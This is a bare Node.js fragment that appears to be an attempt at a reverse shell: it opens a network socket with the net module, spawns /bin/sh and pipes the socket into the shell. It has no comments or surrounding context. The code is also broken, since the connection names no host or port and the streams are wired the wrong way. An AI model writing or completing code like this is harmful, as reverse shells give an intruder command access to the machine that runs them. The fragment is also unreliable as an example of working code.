var net = require('net');
var child = require('child_process');

var socket = net.createConnection()
var myREPL = child.spawn('/bin/sh');
socket.pipe(myREPL.stdout)
